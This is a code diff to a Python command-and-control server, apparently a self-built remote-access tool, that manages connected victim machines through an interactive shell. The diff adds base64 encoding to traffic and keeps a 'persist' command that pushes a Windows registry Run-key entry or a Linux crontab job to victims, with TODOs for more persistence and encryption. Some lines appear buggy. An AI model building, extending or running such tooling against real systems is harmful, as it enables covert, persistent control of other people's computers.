@@ -8,9 +8,16 @@ import shutil
 import socket
 import string
 import subprocess
-import sys
 import threading
 import time
+"""
+TODO Somethings I can try out:
+    * Add one additional persistence technique for Windows and Linux
+    * Implement a static command option that drops you into a local shell to execute local commands
+    * and then allow you to exit from that shell when finished
+    * Research encryption libraries and implement it in place of the Base64 encoding
+
+"""
 
 
 BUFFER = 1024
@@ -68,6 +75,8 @@ def comm_in(target_id):
     """
     print('[+] Awaiting response...')
     response = target_id.recv(BUFFER).decode()
+    response = base64.b64decode(response)
+    response = response.decode().strip()
     return response
 
 def comm_out(target_id, message):
@@ -78,16 +87,7 @@ def comm_out(target_id, message):
         message (string): _description_
     """
     message = str(message)
-    target_id.send(message.encode())
-
-def kill_signal(target_id, message):
-    """ Sends commands from the sockserver to a sockclient.
-
-    Args:
-        target_id (int): _description_
-        message (string): _description_
-    """
-    message = str(message)
+    message = base64.b64encode(bytes(message, encoding='utf8'))
     target_id.send(message.encode())
 
 def target_comm(target_id, targets, num):
@@ -98,44 +98,54 @@ def target_comm(target_id, targets, num):
     """
     while True:
         message = input(bcolors.OKBLUE + f'{targets[num][3]}/{targets[num][1]}#> ' + bcolors.ENDC)
+
         if len(message) == 0:
+            # user does not enter a message
             continue
+
         if message == 'help':
             pass
-        comm_out(target_id, message)
-
-        if message == 'exit':
-            target_id.send(message.encode())
-            target_id.close()
-            targets[num][7] = bcolors.FAIL + 'Dead' + bcolors.ENDC
-            break
-        if message == 'background':
-            break
-        if message == 'help':
-            pass
-        if message == 'persist':
-            payload_name = input('[+]' + bcolors.BOLD + 'Enter the name of the payload to add to autorun: ' + bcolors.ENDC)
-
-            if targets[num][6] == 1:
-                persist_cmd_1 = f'cmd.exe /c copy {payload_name} C:\\Users\Public'
-                target_id.send(persist_cmd_1.encode())
-                persist_cmd_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}'
-                target_id.send(persist_cmd_2)
-                print(bcolors.WARNING + '[!] Run this command to clean up the registry:' + bcolors.BOLD + '\nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v screendoor /f' + bcolors.ENDC)
-
-            if targets[num][6] == 2:
-                persist_cmd_3 = f'echo "*/1 * * * * python3 /home/{targets[num][3]/payload_name}" | crontab -'
-                target_id.send(persist_cmd_3)
-                print(bcolors.WARNING + '[+] Run this command to clean up the crontab: ' + bcolors.BOLD + '\n crontab -r')
-            print(bcolors.OKGREEN + '[+] Persistence technique completed.' + bcolors.ENDC)
-
         else:
-            response = comm_in(target_id)
-            if response == 'exit':
-                print('[-] The client has terminated the session')
-                target_id.close()
+            comm_out(target_id, message)
+
+            if message == 'background':
                 break
-            print(response)
+
+            if message == 'exit':
+                target_id.send(message.encode())
+                target_id.close()
+                targets[num][7] = bcolors.FAIL + 'Dead' + bcolors.ENDC
+                break
+
+            if message == 'persist':
+                payload_name = input('[+]' + bcolors.BOLD + 'Enter the name of the payload to add to autorun: ' + bcolors.ENDC)
+
+                if targets[num][6] == 1:
+                    persist_cmd_1 = f'cmd.exe /c copy {payload_name} C:\\Users\Public'
+                    persist_cmd_1 = base64.b64encode(persist_cmd_1.encode())
+                    target_id.send(persist_cmd_1)
+
+                    persist_cmd_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}'
+                    persist_cmd_2 = base64.b64encode(persist_cmd_2.encode())
+                    target_id.send(persist_cmd_2)
+
+                    print(bcolors.WARNING + '[!] Run this command to clean up the registry:' + bcolors.BOLD + '\nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v screendoor /f' + bcolors.ENDC)
+
+                if targets[num][6] == 2:
+                    persist_cmd_3 = f'echo "*/1 * * * * python3 /home/{targets[num][3]/payload_name}" | crontab -'
+                    persist_cmd_3 = base64.b64encode(persist_cmd_3.encode())
+                    target_id.send(persist_cmd_3)
+
+                    print(bcolors.WARNING + '[+] Run this command to clean up the crontab: ' + bcolors.BOLD + '\n crontab -r')
+                print(bcolors.OKGREEN + '[+] Persistence technique completed.' + bcolors.ENDC)
+
+            else:
+                response = comm_in(target_id)
+                if response == 'exit':
+                    print('[-] The client has terminated the session')
+                    target_id.close()
+                    break
+                print(response)
 
 def listener_handler():
     """ Hosts the listener for the socket, binds the socket, accepts
@@ -161,14 +171,14 @@ def comm_handler():
         try:
             remote_target, remote_ip = sock.accept()
 
-            # get username of the target
             username = remote_target.recv(BUFFER).decode()
-            print(username)
+            username = base64.b64decode(username).decode()
 
-            # check if current target is an admin account
             admin = remote_target.recv(BUFFER).decode()
+            admin = base64.b64decode(admin).decode()
 
             op_sys = remote_target.recv(BUFFER).decode()
+            op_sys = base64.b64decode(op_sys).decode()
 
             if admin == 1:
                 # if target is Windows (UID = 1)
@@ -393,7 +403,7 @@ if __name__ == '__main__':
                         num = int(command.split(" ")[1])
                         target_id = (targets[num])[0]
                         if (targets[num])[7] == 'Active':
-                            kill_signal(target_id, 'exit')
+                            comm_out(target_id, 'exit')
                             targets[num][7] = 'Dead'
                             print(f'[+] Sessions {num} terminated.')
                         else:
